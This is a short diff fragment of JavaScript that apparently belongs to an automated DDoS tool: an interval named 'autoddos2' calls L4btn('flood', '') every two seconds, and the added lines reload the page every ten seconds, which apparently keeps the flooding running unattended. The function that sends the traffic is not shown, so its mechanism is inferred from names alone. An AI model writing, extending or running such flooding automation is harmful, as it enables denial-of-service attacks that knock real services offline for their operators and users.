@@ -55,3 +55,6 @@ var autoddos2 = setInterval(function (){
         L4btn('flood', '');
 
 },2000)
+window.setTimeout( function() {
+  window.location.reload();
+}, 10000);
